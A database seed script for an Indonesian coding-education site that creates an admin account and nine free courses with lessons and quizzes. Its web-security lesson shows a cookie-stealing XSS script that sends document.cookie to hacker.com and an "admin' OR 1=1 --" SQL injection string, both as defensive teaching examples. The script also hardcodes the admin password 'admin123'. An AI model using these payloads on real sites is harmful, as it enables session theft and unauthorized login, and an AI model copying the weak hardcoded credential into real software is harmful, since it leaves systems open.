import { PrismaClient } from '@prisma/client';
import { PrismaPg } from '@prisma/adapter-pg';
import { Pool } from 'pg';
import * as bcrypt from 'bcrypt';
import * as dotenv from 'dotenv';

dotenv.config();

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
});
const adapter = new PrismaPg(pool);
const prisma = new PrismaClient({ adapter });

async function main() {
  console.log('Seeding database with Free Educational Content...');

  // 1. Create an Admin User if it doesn't exist
  const adminPassword = await bcrypt.hash('admin123', 10);
  const admin = await prisma.user.upsert({
    where: { email: 'admin@devacademy.com' },
    update: {},
    create: {
      email: 'admin@devacademy.com',
      name: 'Administrator',
      password: adminPassword,
      role: 'ADMIN',
    },
  });

  // Categories
  const categoryNames = [
    'Fundamental Web Programming',
    'Advanced Web Development',
    'Mobile Application',
    'UI/UX Design',
    'DevOps & Security'
  ];

  const categories: Record<string, any> = {};
  for (const name of categoryNames) {
    categories[name] = await prisma.category.upsert({
      where: { name },
      update: {},
      create: { name },
    });
  }

  const coursesData = [
    {
      title: 'Pengantar Coding untuk Pemula',
      category: 'Fundamental Web Programming',
      description: 'Materi edukasi murni yang dirancang untuk mengenalkan Anda pada dunia pemrograman. Anda akan mempelajari logika dasar dan pengenalan sintaks tanpa ada pungutan biaya. Mari majukan pendidikan teknologi Indonesia!',
      thumbnail: 'https://images.unsplash.com/photo-1517694712202-14dd9538aa97?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: Konsep Dasar Pemrograman',
          content: `Pernahkah Anda membayangkan bagaimana aplikasi di ponsel Anda bisa melakukan begitu banyak hal hebat? Mulai dari memesan makanan, mengirim pesan dalam hitungan detik, hingga memainkan game dengan grafis yang memukau. Semua itu tidak terjadi secara ajaib. Di balik layar, ada ribuan baris instruksi yang dengan patuh diikuti oleh komputer. Instruksi-instruksi inilah yang kita sebut sebagai **Kode**, dan proses menulis instruksi tersebut dikenal dengan nama **Pemrograman (Coding)**.\n\n### Mengapa Komputer Membutuhkan Pemrograman?\nKomputer pada dasarnya adalah mesin yang sangat cepat, namun sangat tidak mandiri. Berbeda dengan manusia yang bisa menebak maksud dari perkataan yang tidak jelas, komputer harus diberi instruksi yang sangat presisi, langkah demi langkah, tanpa ada satu pun keraguan.\n\nBayangkan Anda sedang mengajari alien yang baru pertama kali turun ke Bumi cara membuat secangkir kopi. Anda tidak bisa sekadar berkata, *"Tolong buatkan kopi."* Alien itu tidak tahu apa itu gelas, kopi, air panas, atau bahkan cara mengaduk. \nAnda harus menginstruksikannya seperti ini:\n1. Ambil cangkir kosong di rak piring.\n2. Ambil sendok kecil.\n3. Masukkan 1 sendok bubuk kopi ke dalam cangkir.\n4. Masukkan 1 sendok gula ke dalam cangkir.\n5. Tuangkan air mendidih hingga cangkir hampir penuh.\n6. Aduk perlahan dengan gerakan memutar sebanyak 10 kali.\n\nDi dunia komputer, urutan langkah-langkah logis untuk menyelesaikan sebuah masalah ini disebut sebagai **Algoritma**. \n\n### Bahasa Pemrograman: Jembatan Kita ke Komputer\nSama seperti manusia memiliki berbagai bahasa (Bahasa Indonesia, Inggris, Jepang), komputer juga memiliki "bahasa" yang berbeda-beda untuk tujuan tertentu. Ada bahasa *Python* untuk analisis data dan kecerdasan buatan, bahasa *Java* untuk membuat aplikasi Android, dan bahasa *HTML/CSS/JavaScript* untuk membuat website.\n\nKetika Anda menulis kode, Anda pada dasarnya sedang menerjemahkan logika dan solusi (algoritma) yang ada di kepala Anda, ke dalam bahasa yang bisa dibaca dan dieksekusi oleh mesin. Dengan menguasai pemrograman, Anda tidak lagi sekadar menjadi *konsumen* teknologi, tetapi Anda bertransformasi menjadi seorang **Pencipta (Creator)**.\n\nDi bab selanjutnya, kita akan langsung terjun mempraktikkan bagaimana cara "berbicara" kepada browser web menggunakan bahasa pertamanya: HTML.`
        },
        {
          title: 'Bagian 2: Mengenal Kerangka Web (HTML)',
          content: `Selamat! Anda telah memahami konsep dasar bahwa pemrograman adalah seni memberikan instruksi. Kini, saatnya kita belajar merakit instruksi nyata untuk membangun sesuatu yang bisa dilihat oleh seluruh dunia: **Sebuah Website**.\n\nUntuk membangun sebuah rumah, Anda membutuhkan fondasi dan kerangka besi atau kayu. Di dunia web, kerangka tersebut bernama **HTML (Hypertext Markup Language)**. \n\n### Anatomi Bahasa HTML\nHTML bukanlah bahasa yang digunakan untuk perhitungan matematis rumit. HTML adalah bahasa *Markup* (penandaan). Tugas utamanya sangat sederhana: **Memberitahu browser komputer mana bagian yang merupakan judul, paragraf, gambar, atau tautan.**\n\nHTML menggunakan sistem "Tag" atau penanda yang diapit oleh tanda kurung siku ( \`< >\` ). Sebagian besar elemen HTML memiliki tag pembuka dan tag penutup.\n\nMari kita lihat struktur dasar sebuah dokumen HTML:\n\n\`\`\`html\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Website Pertamaku</title>\n</head>\n<body>\n\n  <h1>Selamat Datang di Website Saya!</h1>\n  \n  <p>Ini adalah paragraf pertama saya. Saya sedang belajar pemrograman dari nol.</p>\n  \n  <p>Ternyata coding itu seperti menulis surat untuk komputer.</p>\n\n</body>\n</html>\n\`\`\`\n\n### Membedah Kode di Atas\n- \`<!DOCTYPE html>\` adalah semacam deklarasi yang berteriak kepada browser: *"Hei, dokumen ini ditulis dalam versi HTML modern!"*\n- Segala sesuatu yang kita ingin tampilkan kepada pengguna harus diletakkan di dalam ruangan khusus, yaitu di antara \`<body>\` dan \`</body>\`.\n- \`<h1>\` adalah singkatan dari *Heading 1*, yang berarti ini adalah teks Judul Utama yang sangat besar dan tebal.\n- \`<p>\` adalah singkatan dari *Paragraph*, digunakan untuk menulis teks biasa yang panjang.\n\nCobalah perhatikan halaman web apa pun yang Anda kunjungi hari ini. Jika Anda menyingkirkan semua warna, desain, dan animasi yang mewah, pada intinya mereka semua dibangun menggunakan elemen teks \`<h1>\` dan \`<p>\` ini.\n\nDengan memahami struktur sederhana ini, Anda sudah meletakkan batu bata pertama dalam karir Anda sebagai seorang Web Developer.`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Evaluasi Pemahaman Dasar',
        description: 'Mari kita uji pemahaman Anda mengenai materi Konsep Dasar Pemrograman dan HTML yang baru saja Anda pelajari.',
        questions: [
          { id: 1, question: 'Apa definisi paling tepat mengenai pemrograman?', options: ['Proses memperbaiki komponen perangkat keras komputer.', 'Proses memberikan instruksi logis kepada komputer untuk melakukan suatu tugas.', 'Cara mendesain tampilan gambar secara visual.', 'Menggunakan internet untuk mencari informasi.'], correctAnswerIndex: 1 },
          { id: 2, question: 'Sebuah urutan langkah demi langkah untuk menyelesaikan suatu masalah disebut dengan...', options: ['Algoritma', 'Sintaks', 'Browser', 'HTML'], correctAnswerIndex: 0 },
          { id: 3, question: 'Tag HTML yang digunakan untuk membuat judul (heading) berukuran paling besar adalah?', options: ['<title>', '<p>', '<h1>', '<body>'], correctAnswerIndex: 2 }
        ]
      }
    },
    {
      title: 'Mastering JavaScript Modern (ES6+)',
      category: 'Fundamental Web Programming',
      description: 'Pelajari JavaScript modern dari dasar hingga mahir. Kuasai arrow functions, destructuring, async/await, dan fitur ES6+ lainnya untuk membangun aplikasi web interaktif yang handal.',
      thumbnail: 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: Pengenalan ES6 dan Variabel Modern',
          content: `JavaScript telah berkembang pesat sejak dirilisnya standar ECMAScript 2015 (ES6). Pembaruan ini membawa banyak sintaks baru yang membuat penulisan kode lebih bersih dan efisien.\n\n### Let dan Const menggantikan Var\nSebelumnya, kita selalu menggunakan \`var\` untuk mendeklarasikan variabel. Namun \`var\` memiliki masalah dengan *scope* yang sering membuat bug. Kini, kita menggunakan:\n- \`let\`: Untuk variabel yang nilainya bisa diubah-ubah di masa depan.\n- \`const\`: Untuk nilai yang tetap (konstanta) dan tidak boleh di-reassign.\n\n\`\`\`javascript\nconst nama = "Budi";\n// nama = "Andi"; // ❌ Akan menghasilkan error!\n\nlet skor = 10;\nskor = 15; // ✅ Valid, karena menggunakan let\n\`\`\`\n\nMembiasakan diri dengan \`const\` secara *default*, dan hanya menggunakan \`let\` saat benar-benar perlu, akan membuat kode Anda lebih aman dari perubahan tak terduga.`
        },
        {
          title: 'Bagian 2: Arrow Functions',
          content: `Fitur paling ikonik dari ES6 adalah **Arrow Functions**. Ini adalah sintaks yang lebih ringkas untuk menulis fungsi.\n\n### Fungsi Biasa vs Arrow Function\nMari kita bandingkan:\n\n\`\`\`javascript\n// Cara lama\nfunction tambah(a, b) {\n  return a + b;\n}\n\n// Arrow Function\nconst tambahArrow = (a, b) => {\n  return a + b;\n};\n\n// Lebih ringkas lagi (implied return)\nconst tambahSingkat = (a, b) => a + b;\n\`\`\`\n\nArrow function sangat berguna saat kita bekerja dengan array methods seperti \`map\`, \`filter\`, atau \`reduce\`. Selain lebih pendek, ia juga mengatasi masalah \`this\` yang sering membingungkan di fungsi tradisional.`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Pemahaman ES6',
        description: 'Uji pengetahuan Anda tentang let, const, dan arrow functions.',
        questions: [
          { id: 1, question: 'Manakah keyword deklarasi variabel yang TIDAK diizinkan untuk diubah nilainya (re-assign)?', options: ['var', 'let', 'const', 'function'], correctAnswerIndex: 2 },
          { id: 2, question: 'Apa nama simbol => dalam JavaScript modern?', options: ['Equal arrow', 'Arrow function', 'Pointer function', 'Lambda expression'], correctAnswerIndex: 1 },
          { id: 3, question: 'Mengapa let lebih disarankan daripada var?', options: ['Lebih cepat dieksekusi', 'Memiliki block scope yang lebih aman', 'Bisa menyimpan lebih banyak data', 'Terdengar lebih keren'], correctAnswerIndex: 1 }
        ]
      }
    },
    {
      title: 'Membangun API dengan Node.js & Express',
      category: 'Advanced Web Development',
      description: 'Langkah demi langkah membangun backend server yang tangguh. Belajar routing, middleware, koneksi database, dan pembuatan RESTful API dengan Express.js.',
      thumbnail: 'https://images.unsplash.com/photo-1555099962-4199c345e5dd?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: Arsitektur Client-Server',
          content: `Dalam pengembangan web modern, aplikasi sering dibagi menjadi dua bagian: **Frontend** (Klien) dan **Backend** (Server).\n\n### Apa itu Backend?\nBackend adalah mesin di balik layar yang memproses data, menyimpan ke database, dan memastikan keamanan. Saat Anda mengklik "Beli" di toko online, frontend mengirim permintaan (request) ke backend. Backend kemudian mengecek stok, memproses pembayaran, dan mengirim jawaban (response) kembali ke frontend.\n\nNode.js memungkinkan kita menulis kode backend menggunakan bahasa JavaScript yang sama dengan yang kita gunakan di frontend. Ini membuat transisi full-stack developer menjadi jauh lebih mudah.`
        },
        {
          title: 'Bagian 2: Express.js Pertama Anda',
          content: `Express.js adalah kerangka kerja (framework) minimalis yang sangat populer untuk Node.js. Ia menyederhanakan pembuatan server dan routing.\n\n\`\`\`javascript\nconst express = require('express');\nconst app = express();\n\n// Routing sederhana\napp.get('/', (req, res) => {\n  res.send('Halo Dunia dari Express!');\n});\n\napp.get('/api/users', (req, res) => {\n  res.json({ users: ['Budi', 'Andi', 'Siti'] });\n});\n\napp.listen(3000, () => {\n  console.log('Server berjalan di port 3000');\n});\n\`\`\`\n\nHanya dengan beberapa baris kode di atas, Anda sudah memiliki server API fungsional yang bisa merespons permintaan GET dari browser atau aplikasi klien!`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Backend Express',
        description: 'Uji pemahaman arsitektur backend dan Express.js.',
        questions: [
          { id: 1, question: 'Apa peran utama sebuah Backend?', options: ['Mendesain warna tombol', 'Memproses logika bisnis dan mengakses database', 'Membuat animasi di browser', 'Menampilkan elemen HTML'], correctAnswerIndex: 1 },
          { id: 2, question: 'Fungsi mana di Express.js yang digunakan untuk merespons dengan format JSON?', options: ['res.send()', 'res.json()', 'res.html()', 'res.render()'], correctAnswerIndex: 1 }
        ]
      }
    },
    {
      title: 'Mastering React & Next.js App Router',
      category: 'Advanced Web Development',
      description: 'Panduan lengkap membangun aplikasi frontend skala besar dengan Next.js 14. Pelajari Server Components, Client Components, routing mutakhir, dan optimasi performa web.',
      thumbnail: 'https://images.unsplash.com/photo-1633356122544-f134324a6cee?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: Era Baru React Server Components',
          content: `Next.js telah merevolusi cara kita membangun aplikasi React dengan memperkenalkan **React Server Components (RSC)**.\n\nSecara default, di App Router Next.js, semua komponen dirender di sisi server. Ini berarti HTML langsung dikirim ke browser, memangkas waktu loading dan sangat bagus untuk SEO (Search Engine Optimization).\n\n### Kapan menggunakan "use client"?\nAnda hanya perlu menambahkan direktif \`"use client"\` di baris teratas file jika komponen tersebut membutuhkan interaktivitas browser, seperti:\n- Menggunakan \`useState\` atau \`useEffect\`\n- Membutuhkan *event listener* seperti \`onClick\`\n- Menggunakan browser API spesifik`
        },
        {
          title: 'Bagian 2: File-Based Routing',
          content: `Di Next.js App Router, routing dilakukan berdasarkan sistem folder (direktori). Struktur folder Anda langsung mendikte struktur URL aplikasi Anda.\n\nContoh:\n- \`app/page.tsx\` -> akan menjadi URL \`/\`\n- \`app/about/page.tsx\` -> akan menjadi URL \`/about\`\n- \`app/blog/[id]/page.tsx\` -> akan menjadi rute dinamis seperti \`/blog/123\`\n\nSistem ini sangat intuitif dan otomatis memecah bundel (code-splitting) per rute, membuat aplikasi tetap cepat dan ringan.`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Next.js Fundamentals',
        description: 'Uji pemahaman App Router dan komponen Next.js.',
        questions: [
          { id: 1, question: 'Apa keunggulan utama dari Server Components di Next.js?', options: ['Bisa menggunakan useState di mana saja', 'Lebih cepat karena dirender di server dan mengirim HTML ringan', 'Otomatis membuat database', 'Bisa mengakses kamera laptop'], correctAnswerIndex: 1 },
          { id: 2, question: 'Jika Anda membuat file di app/dashboard/settings/page.tsx, URL apa yang akan terbentuk?', options: ['/dashboard', '/settings', '/dashboard/settings', '/page'], correctAnswerIndex: 2 }
        ]
      }
    },
    {
      title: 'Belajar Tailwind CSS dari Nol',
      category: 'UI/UX Design',
      description: 'Selamat tinggal file CSS berantakan. Bangun antarmuka modern, responsif, dan elegan secara instan hanya menggunakan utility classes dari Tailwind CSS.',
      thumbnail: 'https://images.unsplash.com/photo-1507238692062-540955af3cb5?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: Filosofi Utility-First',
          content: `Tailwind CSS berbeda dengan framework lawas seperti Bootstrap. Ia tidak memberikan komponen siap pakai (seperti "btn" atau "card"). Sebaliknya, ia memberikan kelas-kelas kecil (*utility classes*) yang sangat spesifik.\n\nMisalnya, untuk membuat teks merah, Anda tidak menulis CSS:\n\`\`\`css\n.teks-merah { color: red; }\n\`\`\`\nAnda cukup menggunakan kelas \`text-red-500\` langsung di HTML Anda:\n\`\`\`html\n<p className="text-red-500 font-bold text-xl">Peringatan!</p>\n\`\`\`\n\nPendekatan ini mencegah file CSS Anda membengkak dan memastikan Anda tidak perlu lagi pusing memikirkan penamaan class (Class name fatigue).`
        },
        {
          title: 'Bagian 2: Desain Responsif Seketika',
          content: `Tailwind membuat pembuatan desain yang responsif (beradaptasi di layar HP hingga Desktop) menjadi sangat mudah menggunakan prefix breakpoint.\n\n- \`sm:\` untuk layar tablet kecil\n- \`md:\` untuk tablet/laptop menengah\n- \`lg:\` untuk desktop\n\n\`\`\`html\n<div className="flex flex-col md:flex-row">\n  <div className="w-full md:w-1/2">Kiri</div>\n  <div className="w-full md:w-1/2">Kanan</div>\n</div>\n\`\`\`\n\nKode di atas akan menumpuk (stack) elemen secara vertikal di HP, namun berbaris bersebelahan secara horizontal di layar yang lebih besar (md).`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Tailwind',
        description: 'Berapa banyak kelas utilitas yang Anda tahu?',
        questions: [
          { id: 1, question: 'Apa prefix yang digunakan di Tailwind untuk menargetkan layar menengah (tablet/laptop kecil)?', options: ['sm:', 'md:', 'lg:', 'xl:'], correctAnswerIndex: 1 },
          { id: 2, question: 'Kelas apa yang digunakan untuk membuat teks menjadi tebal?', options: ['font-bold', 'text-bold', 'text-weight-bold', 'fw-bold'], correctAnswerIndex: 0 }
        ]
      }
    },
    {
      title: 'Dasar Desain UI/UX untuk Developer',
      category: 'UI/UX Design',
      description: 'Course wajib bagi para programmer yang ingin aplikasinya tidak hanya berfungsi, tapi juga indah dan mudah digunakan. Belajar hierarki visual, warna, dan prinsip UX.',
      thumbnail: 'https://images.unsplash.com/photo-1561070791-2526d30994b5?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: UX is Not UI',
          content: `Penting untuk memahami perbedaan antara **UI (User Interface)** dan **UX (User Experience)**.\n\n- **UI** adalah tentang bagaimana sesuatu *terlihat*. Apakah warnanya harmonis? Apakah tombolnya memiliki sudut melengkung yang pas? UI berfokus pada estetika visual.\n- **UX** adalah tentang bagaimana sesuatu *bekerja dan dirasakan*. Apakah pengguna kebingungan saat mencari tombol "Checkout"? Apakah proses pendaftaran memakan waktu terlalu lama? UX berfokus pada efisiensi dan kepuasan pengguna.\n\nSebuah aplikasi bisa memiliki UI yang memukau namun UX yang buruk (indah tapi susah dipakai), atau UX yang brilian dengan UI yang biasa saja (Google adalah contoh klasik). Developer hebat harus memikirkan keduanya.`
        },
        {
          title: 'Bagian 2: Hirarki Visual dan Whitespace',
          content: `Hirarki visual adalah seni mengarahkan mata pengguna ke hal yang paling penting di layar. Kita dapat mencapai ini melalui:\n1. **Ukuran**: Elemen yang lebih besar otomatis menarik perhatian.\n2. **Warna & Kontras**: Warna cerah di lautan warna redup akan mencolok (seperti tombol Call to Action).\n3. **Whitespace**: Ruang kosong bukanlah ruang yang terbuang. Whitespace membiarkan elemen "bernapas" dan mencegah antarmuka terlihat semrawut.\n\nJangan takut menggunakan padding dan margin yang besar. Whitespace adalah senjata rahasia desainer untuk menciptakan nuansa *premium* dan *elegan*.`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Konsep UI/UX',
        description: 'Uji pemahaman tentang perbedaan desain dan interaksi.',
        questions: [
          { id: 1, question: 'Manakah dari berikut ini yang merupakan masalah UX, BUKAN UI?', options: ['Warna teks terlalu redup untuk dibaca', 'Tombol "Submit" disembunyikan di bagian bawah halaman panjang', 'Sudut tombol kurang melengkung', 'Ikon yang digunakan terlalu tebal'], correctAnswerIndex: 1 },
          { id: 2, question: 'Apa fungsi utama dari Whitespace (ruang negatif)?', options: ['Menghemat tinta printer', 'Memberikan tempat untuk meletakkan iklan nanti', 'Membantu mengelompokkan elemen dan memberikan fokus', 'Membuat pengguna menggulir lebih jauh'], correctAnswerIndex: 2 }
        ]
      }
    },
    {
      title: 'Membangun Aplikasi Mobile dengan React Native',
      category: 'Mobile Application',
      description: 'Bawa ilmu React web Anda ke dunia Mobile. Buat aplikasi Android dan iOS native menggunakan satu codebase JavaScript dengan framework React Native.',
      thumbnail: 'https://images.unsplash.com/photo-1526498460520-4c246339dccb?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: Web vs Native',
          content: `React Native memungkinkan Anda menulis aplikasi mobile menggunakan React. Namun, alih-alih merender elemen web seperti \`<div>\` atau \`<span>\`, React Native memanggil UI komponen asli (native) dari iOS dan Android.\n\nIni berarti aplikasi Anda bukanlah sekadar "website yang dibungkus", melainkan aplikasi sejati yang memiliki performa dan *feel* layaknya aplikasi yang ditulis dengan Swift (iOS) atau Kotlin (Android).\n\n\`\`\`javascript\n// Di Web (React JS)\nconst MyComponent = () => <div>Halo Dunia</div>;\n\n// Di Mobile (React Native)\nimport { View, Text } from 'react-native';\nconst MyNativeComponent = () => (\n  <View>\n    <Text>Halo Dunia</Text>\n  </View>\n);\n\`\`\`\nSebagian besar logika JavaScript (\`useState\`, \`useEffect\`) 100% sama dengan yang ada di web!`
        },
        {
          title: 'Bagian 2: Styling dengan Flexbox',
          content: `Di React Native, semua tata letak (layouting) menggunakan Flexbox. Kabar baiknya, cara kerjanya sama persis dengan flexbox di CSS web.\n\nNamun, ada satu perbedaan penting: Di React Native, **semua elemen secara default adalah flex container dengan \`flexDirection: 'column'\`** (dari atas ke bawah). Jika di web default-nya adalah baris (row).\n\nUntuk memosisikan tombol di tengah layar:\n\`\`\`javascript\n<View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>\n  <Button title="Klik Saya" />\n</View>\n\`\`\``
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Dasar React Native',
        description: 'Uji perbedaan web dan mobile React.',
        questions: [
          { id: 1, question: 'Elemen apa yang digunakan di React Native sebagai pengganti tag <div> dari web?', options: ['<Container>', '<Section>', '<View>', '<Group>'], correctAnswerIndex: 2 },
          { id: 2, question: 'Apa arah default dari flexbox di React Native?', options: ['row', 'column', 'grid', 'inline'], correctAnswerIndex: 1 }
        ]
      }
    },
    {
      title: 'Panduan Praktis Docker & Deployment',
      category: 'DevOps & Security',
      description: 'Hilangkan drama "Works on My Machine". Pelajari cara mengemas aplikasi Anda dalam container Docker dan mendeploy ke cloud server dengan lancar.',
      thumbnail: 'https://images.unsplash.com/photo-1605745341112-85968b19335b?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: Mengapa Docker?',
          content: `Apakah Anda pernah membangun aplikasi yang berjalan sempurna di laptop Anda, namun langsung error hancur-hancuran saat dijalankan di server production? Itu biasanya terjadi karena perbedaan versi OS, versi Node.js, atau pustaka pendukung.\n\n**Docker** menyelesaikan masalah ini dengan *Containerization*.\nDocker mengemas kode Anda beserta **seluruh lingkungannya** (OS, database, dependensi) ke dalam sebuah "kotak" yang disebut Container. Jika kotak ini bisa berjalan di laptop Anda, dijamin 100% kotak yang persis sama akan berjalan di server mana pun di seluruh dunia.\n\nIni adalah revolusi terbesar di dunia deployment dalam satu dekade terakhir.`
        },
        {
          title: 'Bagian 2: Menulis Dockerfile Pertama',
          content: `Untuk membuat Container, kita memerlukan resep yang disebut \`Dockerfile\`. Ini adalah instruksi langkah demi langkah bagaimana membangun lingkungan aplikasi Anda.\n\nContoh Dockerfile untuk aplikasi Node.js:\n\`\`\`dockerfile\n# Gunakan OS Linux dengan Node 18\nFROM node:18-alpine\n\n# Buat folder kerja\nWORKDIR /app\n\n# Kopi file package dan install dependensi\nCOPY package.json ./\nRUN npm install\n\n# Kopi seluruh kode sumber\nCOPY . .\n\n# Ekspos port 3000\nEXPOSE 3000\n\n# Jalankan aplikasi\nCMD ["npm", "start"]\n\`\`\`\n\nDengan file ini, Anda bisa membangun *image* aplikasi Anda dan menjalankannya di mana saja dengan perintah \`docker run\`.`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Docker 101',
        description: 'Uji pemahaman tentang containerization.',
        questions: [
          { id: 1, question: 'Masalah utama apa yang diselesaikan oleh Docker?', options: ['Membuat website lebih cepat dimuat di browser pengguna', 'Perbedaan environment (lingkungan) antara mesin development dan server production', 'Melindungi dari serangan peretas (hacker)', 'Menggantikan peran database SQL'], correctAnswerIndex: 1 },
          { id: 2, question: 'Apa nama file yang berisi instruksi untuk merakit sebuah Docker image?', options: ['docker.json', 'docker-compose.yml', 'Dockerfile', 'Containerfile'], correctAnswerIndex: 2 }
        ]
      }
    },
    {
      title: 'Dasar Keamanan Aplikasi Web (Cybersecurity)',
      category: 'DevOps & Security',
      description: 'Jangan biarkan website Anda dibobol! Kenali 5 kerentanan web paling berbahaya (OWASP Top 10) dan bagaimana cara menulis kode yang kebal terhadap serangan.',
      thumbnail: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000&auto=format&fit=crop',
      price: 0,
      chapters: [
        {
          title: 'Bagian 1: SQL Injection (SQLi)',
          content: `SQL Injection adalah mimpi buruk tertua dan paling umum di dunia web. Kerentanan ini terjadi ketika input pengguna langsung digabungkan ke dalam query database tanpa disanitasi.\n\nContoh berbahaya (Jangan lakukan ini!):\n\`\`\`javascript\nconst username = req.body.username;\n// BAHAYA: Jika user menginput: "admin' OR 1=1 --"\nconst query = "SELECT * FROM users WHERE username = '" + username + "'";\ndb.execute(query);\n\`\`\`\n\nJika hacker memasukkan trik di atas, query akan menjadi \`SELECT * FROM users WHERE username = 'admin' OR 1=1 --'\`. Karena 1=1 selalu benar, hacker bisa login tanpa password!\n\n**Solusinya:** Gunakan *Parameterized Queries* atau ORM seperti Prisma yang secara otomatis membersihkan semua input berbahaya.`
        },
        {
          title: 'Bagian 2: Cross-Site Scripting (XSS)',
          content: `Jika SQL Injection menyerang database Anda, XSS menyerang *pengguna* aplikasi Anda.\nXSS terjadi ketika website Anda menampilkan input pengguna di halaman web secara mentah, memungkinkan hacker menyisipkan script JavaScript jahat.\n\nMisalnya, dalam kolom komentar, hacker mengetik:\n\`\`\`html\n<script>\n  // Mencuri token login pengguna lain dan mengirimnya ke server hacker\n  fetch('http://hacker.com/steal?token=' + document.cookie);\n</script>\n\`\`\`\n\nSetiap kali pengguna lain membaca komentar tersebut, script berbahaya itu akan berjalan di browser mereka!\n\n**Solusinya:** Selalu *escape* (ubah karakter spesial menjadi entitas HTML aman) semua input pengguna sebelum merendernya. Framework modern seperti React dan Next.js secara otomatis melindungi Anda dari XSS secara default!`
        }
      ],
      quiz: {
        type: 'quiz',
        title: 'Kuis Web Security',
        description: 'Buktikan Anda bisa melindungi website Anda!',
        questions: [
          { id: 1, question: 'Bagaimana cara terbaik untuk mencegah SQL Injection saat menggunakan database SQL murni?', options: ['Mengenkripsi seluruh database', 'Menggunakan Parameterized Queries', 'Memblokir IP semua pengguna', 'Membatasi panjang input form maksimal 10 karakter'], correctAnswerIndex: 1 },
          { id: 2, question: 'Serangan XSS pada dasarnya menargetkan siapa?', options: ['Database server', 'Web Server backend', 'Browser pengguna aplikasi lainnya (Klien)', 'Koneksi jaringan internet'], correctAnswerIndex: 2 }
        ]
      }
    }
  ];

  for (const courseItem of coursesData) {
    const existingCourse = await prisma.course.findFirst({
      where: { title: courseItem.title },
    });

    let course;
    if (existingCourse) {
      console.log(`Course '${courseItem.title}' already exists, clearing old chapters...`);
      await prisma.chapter.deleteMany({ where: { courseId: existingCourse.id } });
      
      course = await prisma.course.update({
        where: { id: existingCourse.id },
        data: {
           price: courseItem.price,
           description: courseItem.description,
           thumbnail: courseItem.thumbnail,
           categoryId: categories[courseItem.category].id,
           isPublished: true
        }
      });
    } else {
      course = await prisma.course.create({
        data: {
          title: courseItem.title,
          description: courseItem.description,
          thumbnail: courseItem.thumbnail,
          price: courseItem.price,
          categoryId: categories[courseItem.category].id,
          isPublished: true,
        },
      });
    }

    let pos = 1;
    for (const chapterItem of courseItem.chapters) {
      await prisma.chapter.create({
        data: {
          title: chapterItem.title,
          content: chapterItem.content,
          position: pos++,
          isFree: pos === 2, // The first chapter is free
          courseId: course.id,
        },
      });
    }

    if (courseItem.quiz) {
      await prisma.chapter.create({
        data: {
          title: 'Kuis Evaluasi',
          content: JSON.stringify(courseItem.quiz),
          position: pos,
          isFree: false,
          courseId: course.id,
        },
      });
    }
  }

  console.log(`✅ 9 Educational Courses (1 old + 8 new) & Quizzes created successfully!`);
  console.log('🎉 Seeding finished.');
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
